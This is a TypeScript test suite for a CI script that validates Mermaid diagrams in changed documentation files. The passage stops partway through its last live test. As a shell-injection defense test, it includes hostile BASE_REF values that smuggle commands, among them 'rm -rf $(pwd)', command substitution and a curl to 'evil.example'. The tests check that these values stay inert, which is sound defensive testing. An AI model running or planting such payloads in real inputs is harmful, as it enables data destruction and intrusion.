/**
 * bun:test suite for the docs-validation CI wrapper.
 *
 * Tier map:
 * - Tier 1: mode mapping (`pull_request` → pr; everything else, including
 *   `pull_request_target`, → push safe path); pr happy path; exit-code
 *   passthrough; argv construction.
 * - Tier 2: boundaries — empty diff string; empty-string BASE_REF treated as
 *   missing; push-mode empty tree; unreadable markdown content; $GITHUB_STEP_SUMMARY
 *   absent/present/failed branches.
 * - Tier 3: git command failure surfacing (injected recorder AND live child
 *   processes: cwd without a repository, plus a hermetic self-remote fixture
 *   proving the REAL pr empty-diff no-op end to end).
 * - Tier 4 (shell-injection defense): shell-metacharacter BASE_REF must arrive as ONE element
 *   of the spawned argv array — asserted on both the pure builder and a live
 *   process run against the real repository (payload provably inert).
 *
 * No database, no real repo mutations: every side effect is injected except
 * the explicitly-marked LIVE tests, which only read and spawn children inside
 * mkdtemp sandboxes.
 */

import { describe, expect, test } from "bun:test";
import { existsSync } from "node:fs";
import { mkdir, mkdtemp, readFile, rm, writeFile } from "node:fs/promises";
import { tmpdir } from "node:os";
import { join, relative } from "node:path";
import { computeDocsChangedSet, DOCS_DIFF_PARSE_ERROR_PREFIX, DocsDiffParseError } from "@/scripts/ci/changed-docs";
import {
  buildGitDiffArgv,
  type DocsCiIo,
  hasSkippedDirectorySegment,
  isSkippedDirectoryName,
  MISSING_BASE_REF_MESSAGE,
  NOOP_MESSAGE,
  type PipedProcessResult,
  resolveDocsCiMode,
  runValidateDocsCi,
} from "@/scripts/ci/validate-docs-ci";

const FAKE_ROOT = "/fake-repo";
const VALIDATOR_PREFIX = ["bun", "run", "scripts/validate-mermaid.ts"];
const WRAPPER_ABSOLUTE_PATH = join(import.meta.dir, "validate-docs-ci.ts");
const FENCE = "```mermaid";
/** Production pr-mode git argv shape: NUL-record ingestion upstream of the pure core. */
const EXPECTED_GIT_ARGV_TAIL = ["diff", "--name-only", "--diff-filter=ACMR", "-z"];
/** Filename exercising every pathname hazard at once: embedded LF + space + non-ASCII. */
const WEIRD_FILENAME = "re port\nwith LF & ä.md";

/* ------------------------------------------------------------------ */
/* Injection helpers                                                    */
/* ------------------------------------------------------------------ */

/** Base IO whose every side effect THROWS — each test overrides what it allows. */
function io(overrides: Partial<DocsCiIo>): DocsCiIo {
  return {
    eventName: undefined,
    baseRef: undefined,
    githubStepSummaryPath: undefined,
    repoRoot: FAKE_ROOT,
    runCwd: FAKE_ROOT,
    writeStdout: () => {
      throw new Error("unexpected stdout write");
    },
    writeStderr: () => {
      throw new Error("unexpected stderr write");
    },
    spawnPiped: async () => {
      throw new Error("unexpected piped spawn (git)");
    },
    spawnInheritedExit: async () => {
      throw new Error("unexpected inherited spawn (validator)");
    },
    listDirectory: async () => {
      throw new Error("unexpected directory listing");
    },
    readFileOrNull: async () => {
      throw new Error("unexpected file read");
    },
    readCurrentContentSync: () => {
      throw new Error("unexpected sync content read");
    },
    ...overrides,
  };
}

interface SpawnRecorder {
  readonly calls: string[][];
  spawn(argv: readonly string[]): Promise<PipedProcessResult>;
}

function recordingSpawner(results: PipedProcessResult[]): SpawnRecorder {
  const calls: string[][] = [];
  let next = 0;
  return {
    calls,
    async spawn(argv) {
      calls.push([...argv]);
      const result = results[next];
      next += 1;
      if (!result) throw new Error(`no canned result for spawn #${next}`);
      return result;
    },
  };
}

type InheritedRecorder = { calls: string[][]; spawn(argv: readonly string[]): Promise<number> };

function recordingValidatorExit(codes: number[]): InheritedRecorder {
  const calls: string[][] = [];
  let next = 0;
  return {
    calls,
    async spawn(argv) {
      calls.push([...argv]);
      const code = codes[next];
      next += 1;
      if (typeof code !== "number") throw new Error(`no canned exit for validator spawn #${next}`);
      return code;
    },
  };
}

const fileEntry = { name: "", isDirectory: () => false };

/** Build a listDirectory implementation from a flat list of relative paths. */
function layoutWalker(root: string, relativePaths: readonly string[]) {
  const directories = new Map<string, { name: string; isDirectory: () => boolean }[]>();
  const ensureDir = (key: string): { name: string; isDirectory: () => boolean }[] => {
    const existing = directories.get(key);
    if (existing) return existing;
    const created: { name: string; isDirectory: () => boolean }[] = [];
    directories.set(key, created);
    return created;
  };
  for (const path of relativePaths) {
    const segments = path.split("/");
    let prefix = "";
    for (let index = 0; index < segments.length - 1; index += 1) {
      const segment = segments[index];
      if (!segment) continue;
      const bucket = ensureDir(prefix);
      if (!bucket.some(entry => entry.name === segment)) {
        bucket.push({ name: segment, isDirectory: () => true });
      }
      prefix = `${prefix}${segment}/`;
    }
    const last = segments[segments.length - 1] ?? "";
    if (last.length > 0) {
      const leafBucket = ensureDir(prefix);
      if (!leafBucket.some(entry => entry.name === last)) {
        leafBucket.push({ ...fileEntry, name: last });
      }
    }
  }
  ensureDir(""); // the walk always starts by listing the root bucket

  return {
    seenDirectories: [] as string[],
    list: async (dir: string): Promise<readonly { name: string; isDirectory: () => boolean }[]> => {
      const rel = dir === root ? "" : `${relative(root, dir).split("\\").join("/")}/`;
      const entries = directories.get(rel);
      if (!entries) throw new Error(`walker asked for unmapped directory: ${dir}`);
      return entries;
    },
  };
}

/** Live-process helper: run the wrapper as a REAL child of this test process. */
async function runWrapperLive(options: {
  cwd: string;
  env: Record<string, string>;
}): Promise<{ code: number; stdout: string; stderr: string }> {
  const proc = Bun.spawn([process.execPath, "run", WRAPPER_ABSOLUTE_PATH], {
    cwd: options.cwd,
    env: options.env,
    stdout: "pipe",
    stderr: "pipe",
  });
  const [stdout, stderr, code] = await Promise.all([
    new Response(proc.stdout).text(),
    new Response(proc.stderr).text(),
    proc.exited,
  ]);
  return { code, stdout, stderr };
}

/** Child-env builder: inherit shell PATH/tooling but drop CI summary wiring. */
function liveEnv(overrides: Record<string, string>): Record<string, string> {
  const env: Record<string, string> = {};
  for (const [key, value] of Object.entries(process.env)) {
    if (value !== undefined && key !== "GITHUB_STEP_SUMMARY" && key !== "EVENT_NAME" && key !== "BASE_REF") {
      env[key] = value;
    }
  }
  return { ...env, ...overrides };
}

/** Run one git command in a sandbox directory; throws on nonzero. */
async function gitOk(cwd: string, args: readonly string[]): Promise<void> {
  const proc = Bun.spawn(["git", ...args], { cwd, stdout: "pipe", stderr: "pipe" });
  const [, stderr, code] = await Promise.all([
    new Response(proc.stdout).text(),
    new Response(proc.stderr).text(),
    proc.exited,
  ]);
  if (code !== 0) throw new Error(`git ${args.join(" ")} failed (${code}): ${stderr}`);
}

/* ------------------------------------------------------------------ */
/* Tier 1 — mode resolution & pure argv builder                         */
/* ------------------------------------------------------------------ */

describe("resolveDocsCiMode (Tier 1)", () => {
  test("pull_request maps to pr mode", () => {
    expect(resolveDocsCiMode("pull_request")).toBe("pr");
  });

  test("push maps to push mode", () => {
    expect(resolveDocsCiMode("push")).toBe("push");
  });

  test("pull_request_target deliberately maps to the PUSH safe path", () => {
    expect(resolveDocsCiMode("pull_request_target")).toBe("push");
  });

  test("undefined / empty / unknown / case-mismatch all fall back to push", () => {
    expect(resolveDocsCiMode(undefined)).toBe("push");
    expect(resolveDocsCiMode("")).toBe("push");
    expect(resolveDocsCiMode("schedule")).toBe("push");
    expect(resolveDocsCiMode("PULL_REQUEST")).toBe("push"); // exact-match policy
  });
});

describe("buildGitDiffArgv (Tier 1 + Tier 4 surface)", () => {
  test("produces exactly eight elements: config pair, subcommand, filters, -z, operand", () => {
    expect(buildGitDiffArgv("release/1.2")).toStrictEqual([
      "git",
      "-c",
      "core.quotePath=false",
      "diff",
      "--name-only",
      "--diff-filter=ACMR",
      "-z",
      "origin/release/1.2...HEAD",
    ]);
  });

  test("-c core.quotePath=false sits BEFORE the subcommand; -z is a plain flag element", () => {
    const argv = buildGitDiffArgv("main");
    expect(argv[0]).toBe("git");
    expect(argv.slice(1, 3)).toStrictEqual(["-c", "core.quotePath=false"]);
    expect(argv[3]).toBe("diff"); // instance config MUST precede the subcommand
    expect(argv.slice(3, 7)).toStrictEqual(EXPECTED_GIT_ARGV_TAIL); // diff/--name-only/--diff-filter/-z ⇒ NUL records
  });

  test("hostile BASE_REF stays ONE array element — never merged into a shell string", () => {
    const hostile = "; rm -rf $(pwd) `id` && curl evil.example";
    const argv = buildGitDiffArgv(hostile);
    expect(argv).toHaveLength(8);
    expect(argv[7]).toBe(`origin/${hostile}...HEAD`);
    // No whitespace-joined single-command form exists anywhere in the result:
    expect(argv.filter(element => element.includes("rm -rf"))).toStrictEqual([argv[7]]);
  });
});

/* ------------------------------------------------------------------ */
/* Tier 1/2 — pr-mode core behavior                                     */
/* ------------------------------------------------------------------ */

describe("runValidateDocsCi — pr mode", () => {
  test("happy path: diff → pure core → exact validator argv → child exit passed through", async () => {
    const git = recordingSpawner([{ code: 0, stdout: "docs/b.mmd\u0000src/code.ts\u0000README.md\u0000", stderr: "" }]);
    const validator = recordingValidatorExit([0]);
    const code = await runValidateDocsCi(
      io({
        eventName: "pull_request",
        baseRef: "release/1.2",
        spawnPiped: git.spawn,
        spawnInheritedExit: validator.spawn,
        readCurrentContentSync: path => (path === "docs/b.mmd" ? "graph TD" : null),
      })
    );

    expect(code).toBe(0);
    expect(git.calls).toHaveLength(1);
    expect(git.calls[0]).toStrictEqual([
      "git",
      "-c",
      "core.quotePath=false",
      ...EXPECTED_GIT_ARGV_TAIL,
      "origin/release/1.2...HEAD",
    ]);
    expect(validator.calls).toStrictEqual([[...VALIDATOR_PREFIX, "docs/b.mmd"]]);
  });

  test("nonzero validator exit is propagated EXACTLY (7) — no || true rewiring", async () => {
    const git = recordingSpawner([{ code: 0, stdout: "docs/a.md\u0000", stderr: "" }]);
    const validator = recordingValidatorExit([7]);
    const code = await runValidateDocsCi(
      io({
        eventName: "pull_request",
        baseRef: "main",
        spawnPiped: git.spawn,
        spawnInheritedExit: validator.spawn,
        readCurrentContentSync: path => (path === "docs/a.md" ? "# doc" : null),
      })
    );
    expect(code).toBe(7);
    expect(validator.calls[0]?.slice(0, 3)).toStrictEqual(VALIDATOR_PREFIX);
  });

  test("empty diff ⇒ verbatim no-op line on stdout, exit 0, validator NEVER spawned", async () => {
    const git = recordingSpawner([{ code: 0, stdout: "src/only.ts\u0000", stderr: "" }]);
    const stdoutLines: string[] = [];
    const code = await runValidateDocsCi(
      io({
        eventName: "pull_request",
        baseRef: "main",
        githubStepSummaryPath: undefined,
        spawnPiped: git.spawn,
        readCurrentContentSync: () => null, // code-only candidates resolve deleted/irrelevant
        writeStdout: text => {
          stdoutLines.push(text);
        },
      })
    );
    expect(code).toBe(0);
    expect(stdoutLines).toStrictEqual([`${NOOP_MESSAGE}\n`]);
  });

  test("missing BASE_REF fails fast with the named materializer-parity message", async () => {
    const stderrLines: string[] = [];
    const code = await runValidateDocsCi(
      io({
        eventName: "pull_request",
        baseRef: undefined,
        writeStderr: text => {
          stderrLines.push(text);
        },
      })
    );
    expect(code).toBe(1);
    expect(stderrLines).toStrictEqual([`${MISSING_BASE_REF_MESSAGE}\n`]);
    expect(MISSING_BASE_REF_MESSAGE).toBe("missing required CI env variable: BASE_REF");
  });

  test("empty-string BASE_REF counts as missing too (boundary)", async () => {
    const stderrChunks: string[] = [];
    const code = await runValidateDocsCi(
      io({
        eventName: "pull_request",
        baseRef: "",
        writeStderr: text => {
          stderrChunks.push(text);
        },
      })
    );
    expect(code).toBe(1);
    expect(stderrChunks.join("")).toContain(MISSING_BASE_REF_MESSAGE);
  });

  test("deleted docs file (sync content null) drops out before the validator spawn", async () => {
    const git = recordingSpawner([{ code: 0, stdout: "docs/gone.md\u0000docs/here.mmd\u0000", stderr: "" }]);
    const validator = recordingValidatorExit([0]);
    const code = await runValidateDocsCi(
      io({
        eventName: "pull_request",
        baseRef: "develop",
        spawnPiped: git.spawn,
        spawnInheritedExit: validator.spawn,
        readCurrentContentSync: path => (path === "docs/here.mmd" ? "graph LR" : null), // gone.md deleted
      })
    );
    expect(code).toBe(0);
    expect(validator.calls).toStrictEqual([[...VALIDATOR_PREFIX, "docs/here.mmd"]]);
  });
});

/* ------------------------------------------------------------------ */
/* Nul-record ingestion + loud-fail closure                             */
/* ------------------------------------------------------------------ */

describe("nul ingestion (pr mode)", () => {
  test("legacy C-quoted ghost line trips the named loud-fail guard: attributed stderr + exit 1", async () => {
    // The historic fail-open, now impossible to miss: a C-quoted record such as
    // `"path\nwith\nLF.md"` (what git used to emit for a filename containing an
    // LF even under core.quotePath=false) dissolves into ghost fragments that
    // resolve nonexistent and were silently DROPPED before any fence scan. The
    // leading-quote guard rejects the WHOLE payload instead of validating a
    // subset or passing green: fail-CLOSED with a named message and exit 1.
    const git = recordingSpawner([{ code: 0, stdout: `"path\\nwith\\nLF.md"\u0000`, stderr: "" }]);
    const stderrChunks: string[] = [];
    let contentReads = 0;
    const code = await runValidateDocsCi(
      io({
        eventName: "pull_request",
        baseRef: "main",
        spawnPiped: git.spawn,
        readCurrentContentSync: () => {
          contentReads += 1;
          return "unused";
        },
        writeStderr: text => {
          stderrChunks.push(text);
        },
      })
    );
    expect(code).toBe(1);
    expect(stderrChunks.join("")).toContain(`docs-validation: ${DOCS_DIFF_PARSE_ERROR_PREFIX}`);
    expect(stderrChunks.join("")).toContain("C-quoted pathname requires -z nul-mode ingestion");
    expect(contentReads).toBe(0); // rejected BEFORE any content resolution
  });

  test("nul round-trip: filename containing LF + spaces + ä survives as ONE argv element to the validator", async () => {
    const fencedContent = mdDocument([FENCE, "flowchart TD", "A-->B", "```", ""]);
    const git = recordingSpawner([{ code: 0, stdout: `${WEIRD_FILENAME}\u0000docs/plain-b.md\u0000`, stderr: "" }]);
    const validator = recordingValidatorExit([0]);
    const code = await runValidateDocsCi(
      io({
        eventName: "pull_request",
        baseRef: "main",
        spawnPiped: git.spawn,
        spawnInheritedExit: validator.spawn,
        readCurrentContentSync: path => (path === WEIRD_FILENAME ? fencedContent : "# plain doc"),
      })
    );
    expect(code).toBe(0);
    expect(validator.calls).toHaveLength(1);
    expect(validator.calls[0]).toStrictEqual([
      ...VALIDATOR_PREFIX,
      "docs/plain-b.md", // deterministic UTF-16 order ahead of "re port…"
      WEIRD_FILENAME, // single intact element: \n / spaces / non-ASCII preserved verbatim
    ]);
    expect(validator.calls[0]?.at(-1)).toContain("\n"); // proof of embedded-LF fidelity
  });

  test("pure core agrees with the wrapper ingestion: guarded entries throw in BOTH modes", () => {
    const reader = readerLike({ [WEIRD_FILENAME]: "content" });
    // Default = legacy newline mode keeps its contract…
    expect(computeDocsChangedSet(`${WEIRD_FILENAME}\n`, path => (path === WEIRD_FILENAME ? "x" : null))).toStrictEqual(
      []
    ); // …but a name WITH control chars can never be represented there
    expect(() => computeDocsChangedSet(`"${WEIRD_FILENAME}"`, reader)).toThrow(DocsDiffParseError); // C-quoted newline payload → named throw
    expect(() => computeDocsChangedSet(`"${WEIRD_FILENAME}"\u0000`, reader, { input: "nul" })).toThrow(
      DocsDiffParseError
    ); // quote marker is fatal under -z too
  });
});

/** Injected reader alias local to this file's nul-ingestion block (same shape as changed-docs tests). */
function readerLike(contents: Record<string, string>): (path: string) => string | null {
  return path => contents[path] ?? null;
}

/* ------------------------------------------------------------------ */
/* Pr-mode `.agents` parity with the push-walk skip set                 */
/* ------------------------------------------------------------------ */

describe("pr/push skip-set parity", () => {
  test("isSkippedDirectoryName exposes the shared walk/skip decision purely", () => {
    expect(isSkippedDirectoryName(".agents")).toBe(true);
    expect(isSkippedDirectoryName(".git")).toBe(true);
    expect(isSkippedDirectoryName(".next")).toBe(true);
    expect(isSkippedDirectoryName(".turbo")).toBe(true);
    expect(isSkippedDirectoryName("node_modules")).toBe(true);
    expect(isSkippedDirectoryName("docs")).toBe(false);
    expect(isSkippedDirectoryName("agents")).toBe(false); // exact names, no prefix fuzz
  });

  test("hasSkippedDirectorySegment matches leading directory segments only", () => {
    expect(hasSkippedDirectorySegment(".agents/skills/c4-architecture/references/deep.mmd")).toBe(true);
    expect(hasSkippedDirectorySegment(".agents/skills/mermaid-diagrams/SKILL.md")).toBe(true);
    expect(hasSkippedDirectorySegment("libs/node_modules/leftover/fenced.md")).toBe(true);
    // Over-filtering regressions — real project surface stays selectable:
    expect(hasSkippedDirectorySegment("docs/x.md")).toBe(false);
    expect(hasSkippedDirectorySegment("agents-like/fenced.md")).toBe(false);
    expect(hasSkippedDirectorySegment("README.md")).toBe(false);
  });

  test("regression: changed-set containing .agents skill paths is filtered out; docs/x.md kept", async () => {
    const agentSkillMarkdown = mdDocument(["instruction placeholder", FENCE, "flowchart TD", "X-->Y", FENCE, ""]);
    const git = recordingSpawner([
      {
        code: 0,
        stdout: ".agents/skills/c4-architecture/references/deep.mmd\u0000.docs-x/y.mmd\u0000docs/x.md\u0000",
        stderr: "",
      },
    ]);
    const validator = recordingValidatorExit([0]);
    const code = await runValidateDocsCi(
      io({
        eventName: "pull_request",
        baseRef: "main",
        spawnPiped: git.spawn,
        spawnInheritedExit: validator.spawn,
        readCurrentContentSync: path => {
          // Content WOULD qualify under needsMermaidValidation — only the
          // skip-directory filter keeps these out of the validator argv.
          if (path === ".agents/skills/c4-architecture/references/deep.mmd") return "graph TD";
          if (path.startsWith(".agents/skills/mermaid-diagrams/")) return agentSkillMarkdown;
          if (path === "docs/x.md") return "# kept";
          return null;
        },
      })
    );
    expect(code).toBe(0);
    expect(validator.calls).toStrictEqual([[...VALIDATOR_PREFIX, "docs/x.md"]]);
  });

  test("dot-file at repo ROOT named like a watch hit still validates (no over-exclusion)", async () => {
    const git = recordingSpawner([{ code: 0, stdout: "root.mmd\u0000", stderr: "" }]);
    const validator = recordingValidatorExit([0]);
    const code = await runValidateDocsCi(
      io({
        eventName: "pull_request",
        baseRef: "main",
        spawnPiped: git.spawn,
        spawnInheritedExit: validator.spawn,
        readCurrentContentSync: path => (path === "root.mmd" ? "graph LR" : null),
      })
    );
    expect(code).toBe(0);
    expect(validator.calls).toStrictEqual([[...VALIDATOR_PREFIX, "root.mmd"]]);
  });
});

/* ------------------------------------------------------------------ */
/* Git failure surfacing                                                */
/* ------------------------------------------------------------------ */

describe("runValidateDocsCi — pr-mode git failure", () => {
  test("child exit code propagates and raw multi-line stderr is surfaced un-truncated", async () => {
    const rawGitStderr = ["fatal: ambiguous argument 'origin/nope...HEAD'", "another line preserved", ""].join("\n");
    const git = recordingSpawner([{ code: 128, stdout: "", stderr: rawGitStderr }]);
    const stderrChunks: string[] = [];
    const code = await runValidateDocsCi(
      io({
        eventName: "pull_request",
        baseRef: "nope",
        spawnPiped: git.spawn,
        writeStderr: text => {
          stderrChunks.push(text);
        },
      })
    );

    expect(code).toBe(128);
    const combined = stderrChunks.join("");
    expect(combined).toContain("docs-validation:");
    expect(combined).toContain(rawGitStderr); // whole payload, byte-for-byte substring
    expect(combined.endsWith(rawGitStderr)).toBe(true); // nothing trimmed/appended after it
  });
});

/* ------------------------------------------------------------------ */
/* Tier 2/3 — push-mode full-set scan over injected synthetic trees     */
/* ------------------------------------------------------------------ */

/** Render markdown lines as one LF-terminated document (last empty line adds the trailing newline). */
function mdDocument(lines: readonly string[]): string {
  return [...lines, ""].join("\n");
}

const FULL_TREE_PATHS = [
  "README-fenced.md",
  "d.mmm.txt",
  "docs/a.md",
  "docs/plain-b.md",
  "docs/sub/nested.mmd",
  "deep/dir/thing.md",
  "pkg/fenced.md",
  "notes/x.txt",
];

describe("runValidateDocsCi — push mode full-set scan", () => {
  test("walks watch patterns + fenced fallback; output deterministic-sorted into validator argv", async () => {
    const walker = layoutWalker(FAKE_ROOT, FULL_TREE_PATHS);
    const validator = recordingValidatorExit([0]);
    const contents: Record<string, string> = {
      "README-fenced.md": mdDocument(["prose", "```mermaid", "flowchart TD", "A-->B", "```", ""]),
      "pkg/fenced.md": mdDocument(["```mermaid", "sequenceDiagram", "A->>B: hi", "```", ""]),
      "deep/dir/thing.md": "plain markdown, no fences",
    };
    const code = await runValidateDocsCi(
      io({
        eventName: "push",
        repoRoot: FAKE_ROOT,
        spawnInheritedExit: validator.spawn,
        listDirectory: walker.list,
        readFileOrNull: async path => contents[path] ?? null,
      })
    );

    expect(code).toBe(0);
    expect(validator.calls).toHaveLength(1);
    expect(validator.calls[0]).toStrictEqual([
      ...VALIDATOR_PREFIX,
      "README-fenced.md",
      "docs/a.md",
      "docs/plain-b.md",
      "docs/sub/nested.mmd",
      "pkg/fenced.md",
    ]);
  });

  test("watch-pattern hits never consult file content; unreadable fallback candidates are excluded", async () => {
    const walker = layoutWalker(FAKE_ROOT, ["docs/locked.md", "maybe/fenced.md"]);
    const validator = recordingValidatorExit([0]);
    const code = await runValidateDocsCi(
      io({
        eventName: "push",
        repoRoot: FAKE_ROOT,
        spawnInheritedExit: validator.spawn,
        listDirectory: walker.list,
        readFileOrNull: async path => {
          if (path === "maybe/fenced.md") return null; // simulated unreadable binary/perms
          throw new Error(`content must NOT be read for watch-hit: ${path}`);
        },
      })
    );
    expect(code).toBe(0);
    expect(validator.calls[0]).toStrictEqual([...VALIDATOR_PREFIX, "docs/locked.md"]);
  });

  test("VCS/build directories are pruned from discovery entirely", async () => {
    const walker = layoutWalker(FAKE_ROOT, [
      ".git/hooks/x.mmd",
      "node_modules/leftover/docs-like.md",
      ".next/cache/fenced.md",
      "docs/real.md",
    ]);
    const validator = recordingValidatorExit([0]);
    const code = await runValidateDocsCi(
      io({
        eventName: "push",
        repoRoot: FAKE_ROOT,
        spawnInheritedExit: validator.spawn,
        listDirectory: walker.list, // throws if any pruned subtree is entered
        readFileOrNull: async path => (path === "node_modules/leftover/docs-like.md" ? `${FENCE}\ngraph TD\n` : null),
      })
    );
    expect(code).toBe(0);
    expect(walker.seenDirectories).toHaveLength(0); // walker never consulted for pruned dirs
    expect(validator.calls[0]).toStrictEqual([...VALIDATOR_PREFIX, "docs/real.md"]);
  });

  test("dot-prefixed tooling directories (.agents) are pruned like VCS/build caches", async () => {
    const walker = layoutWalker(FAKE_ROOT, [
      ".agents/skills/mermaid-diagrams/SKILL.md",
      ".agents/skills/c4-architecture/references/deep.mmd",
      "agents-like/fenced.md",
      "docs/real.md",
    ]);
    const consultedDirectories: string[] = [];
    const validator = recordingValidatorExit([0]);
    const code = await runValidateDocsCi(
      io({
        eventName: "push",
        repoRoot: FAKE_ROOT,
        spawnInheritedExit: validator.spawn,
        listDirectory: async dir => {
          consultedDirectories.push(dir);
          return walker.list(dir);
        },
        readFileOrNull: async path => {
          // ANY read under .agents means the prune failed loudly — even if the
          // placeholder fence below would be selected, the argv assert below
          // already guarantees failure; this documents the fixture intent.
          if (path.startsWith(".agents")) throw new Error(`prune breach — content read of ${path}`);
          if (path === "docs/real.md") return "# doc";
          if (path === "agents-like/fenced.md") return mdDocument(["```mermaid", "flowchart TD", "A-->B", "```", ""]);
          throw new Error(`unexpected content read: ${path}`);
        },
      })
    );

    expect(code).toBe(0);
    // Walker NEVER descended into the tooling subtree (exact dot-name skip),
    // so neither its placeholder-fenced markdown NOR its watch-hit .mmd file
    // can leak into the full-set scan.
    expect(consultedDirectories.some(dir => dir.split("/").includes(".agents"))).toBe(false);
    expect(validator.calls[0]).toStrictEqual([...VALIDATOR_PREFIX, "agents-like/fenced.md", "docs/real.md"]);
  });

  test("fully empty working tree still passes via explicit no-op", async () => {
    const walker = layoutWalker(FAKE_ROOT, []);
    const stdoutLines: string[] = [];
    const code = await runValidateDocsCi(
      io({
        eventName: "push",
        repoRoot: FAKE_ROOT,
        listDirectory: walker.list,
        writeStdout: text => {
          stdoutLines.push(text);
        },
      })
    );
    expect(code).toBe(0);
    expect(stdoutLines).toStrictEqual([`${NOOP_MESSAGE}\n`]);
  });
});

/* ------------------------------------------------------------------ */
/* GITHUB_STEP_SUMMARY branches                                         */
/* ------------------------------------------------------------------ */

describe("GITHUB_STEP_SUMMARY handling", () => {
  test("present path receives exactly the no-op line once (real temp file)", async () => {
    const sandbox = await mkdtemp(join(tmpdir(), "dev3-v23-summary-"));
    const summaryPath = join(sandbox, "summary.md");
    const git = recordingSpawner([{ code: 0, stdout: "", stderr: "" }]);
    try {
      const stdoutLines: string[] = [];
      const code = await runValidateDocsCi(
        io({
          eventName: "pull_request",
          baseRef: "main",
          githubStepSummaryPath: summaryPath,
          spawnPiped: git.spawn,
          writeStdout: text => {
            stdoutLines.push(text);
          },
        })
      );
      expect(code).toBe(0);
      expect(stdoutLines).toStrictEqual([`${NOOP_MESSAGE}\n`]);
      expect(await readFile(summaryPath, "utf8")).toBe(`${NOOP_MESSAGE}\n`);
    } finally {
      await rm(sandbox, { recursive: true, force: true });
    }
  });

  test("unwritable summary path fails loudly with attributed stderr (defined behavior)", async () => {
    const badPath = join(tmpdir(), "dev3-v23-no-such-dir-xyz", "summary.md");
    const stderrChunks: string[] = [];
    const stdoutLines: string[] = [];
    const git = recordingSpawner([{ code: 0, stdout: "src/app.ts\u0000", stderr: "" }]);
    const code = await runValidateDocsCi(
      io({
        eventName: "pull_request",
        baseRef: "main",
        githubStepSummaryPath: badPath,
        spawnPiped: git.spawn,
        readCurrentContentSync: () => null,
        // The verbatim no-op line STILL reaches stdout before the summary failure.
        writeStdout: text => {
          stdoutLines.push(text);
        },
        writeStderr: text => {
          stderrChunks.push(text);
        },
      })
    );
    expect(code).toBe(1);
    expect(stdoutLines).toStrictEqual([`${NOOP_MESSAGE}\n`]);
    expect(stderrChunks.join("")).toContain("failed to append no-op line to GITHUB_STEP_SUMMARY");
  });
});

/* ------------------------------------------------------------------ */
/* Env-decoupling guard                                                 */
/* ------------------------------------------------------------------ */

test("explicit io inputs override ambient process.env (entry-boundary capture)", async () => {
  const previous = process.env.EVENT_NAME;
  process.env.EVENT_NAME = "pull_request"; // would select pr mode if the core peeked at globals
  try {
    const walker = layoutWalker(FAKE_ROOT, ["docs/x.md"]);
    const validator = recordingValidatorExit([0]);
    const code = await runValidateDocsCi(
      io({
        eventName: "push", // parameter wins over environment noise
        repoRoot: FAKE_ROOT,
        spawnInheritedExit: validator.spawn,
        listDirectory: walker.list,
        readFileOrNull: async () => null,
      })
    );
    expect(code).toBe(0);
    expect(validator.calls[0]).toStrictEqual([...VALIDATOR_PREFIX, "docs/x.md"]);
  } finally {
    if (previous === undefined) delete process.env.EVENT_NAME;
    else process.env.EVENT_NAME = previous;
  }
});

/* ------------------------------------------------------------------ */
/* Tier 3/4 — LIVE child-process integration (real bun + real git)      */
/* ------------------------------------------------------------------ */

describe("LIVE processes", () => {
  test("cwd without a repository: git failure surfaces un-truncated and exits nonzero", async () => {
    const sandbox = await mkdtemp(join(tmpdir(), "dev3-v23-norepo-"));
    try {
      const result = await runWrapperLive({
        cwd: sandbox,
        env: liveEnv({ EVENT_NAME: "pull_request", BASE_REF: "main" }),
      });
      expect(result.code).not.toBe(0);
      expect(result.stderr).toContain("docs-validation:");
      // git's OWN diagnosis reached the log intact (exact wording varies by git
      // version: modern builds fall back to --no-index usage outside a tree).
      expect(result.stderr.toLowerCase()).toContain("not a git repository");
    } finally {
      await rm(sandbox, { recursive: true, force: true });
    }
  });

  test("metacharacter BASE_REF against the real repo: inert argv element, nonzero exit, no side effects", async () => {
    const sandbox = await mkdtemp(join(tmpdir(), "dev3-v23-pwnprobe-"));
    const canary = join(sandbox, "pwn-canary");
    try {
      const baseRef = `\`id\`; x=$(touch ${canary}) ; y=\${HOME}`;
      const result = await runWrapperLive({
        cwd: REPO_ROOT_SANDBOX(),
        env: liveEnv({ EVENT_NAME: "pull_request", BASE_REF: baseRef }),
      });
      expect(result.code).not.toBe(0); // git rejects the bogus revision…
      expect(result.code).toBe(128); // …with its OWN usage/revision error, not a shell's
      expect(existsSync(canary)).toBe(false); // payload never executed
      expect(result.stderr).toContain("docs-validation:");
    } finally {
      await rm(sandbox, { recursive: true, force: true });
    }
  });

  test("hermetic self-remote repo: real pr empty-diff no-op end-to-end (before & after a code-only commit)", async () => {
    const sandbox = await mkdtemp(join(tmpdir(), "dev3-v23-prbench-"));
    try {
      await mkdir(join(sandbox, "src"), { recursive: true });
      await writeFile(join(sandbox, "README.md"), "# bench\n");
      await gitOk(sandbox, ["init"]);
      await gitOk(sandbox, ["config", "user.email", "ci@example.test"]);
      await gitOk(sandbox, ["config", "user.name", "ci-bench"]);
      await gitOk(sandbox, ["add", "."]);
      await gitOk(sandbox, ["commit", "-m", "init"]);
      await gitOk(sandbox, ["branch", "-M", "main"]);
      await gitOk(sandbox, ["remote", "add", "origin", sandbox]); // self-remote so origin/main exists
      await gitOk(sandbox, ["fetch", "origin"]);

      const first = await runWrapperLive({
        cwd: sandbox,
        env: liveEnv({ EVENT_NAME: "pull_request", BASE_REF: "main" }),
      });
      expect(first.code).toBe(0);
      expect(first.stdout).toBe(`${NOOP_MESSAGE}\n`);
      expect(first.stderr).toBe("");

      await writeFile(join(sandbox, "src", "app.ts"), "export const x = 1;\n");
      await gitOk(sandbox, ["add", "."]);
      await gitOk(sandbox, ["commit", "-m", "code only"]);

      const second = await runWrapperLive({
        cwd: sandbox,
        env: liveEnv({ EVENT_NAME: "pull_request", BASE_REF: "main" }),
      });
      expect(second.code).toBe(0);
      expect(second.stdout).toBe(`${NOOP_MESSAGE}\n`);

      // Exotic filename (embedded LF + space + umlaut)
      // carrying a valid mermaid fence. The `-z` ingestion executes through the
      // FULL wrapper against REAL git bytes: no crash, no ghost mis-parse. The
      // entry resolves null against the wrapper's repo-root content anchor
      // (production delete/unreadable semantics for names absent on disk), so
      // the run stays green via the explicit no-op line.
      await writeFile(join(sandbox, WEIRD_FILENAME), mdDocument([FENCE, "graph TD", "A-->B", "```", ""]));
      await writeFile(join(sandbox, join("src", "app2.ts")), "export const y = 2;\n");
      await gitOk(sandbox, ["add", "-A", "."]);
      await gitOk(sandbox, ["commit", "-m", "exotic name"]);

      const third = await runWrapperLive({
        cwd: sandbox,
        env: liveEnv({ EVENT_NAME: "pull_request", BASE_REF: "main" }),
      });
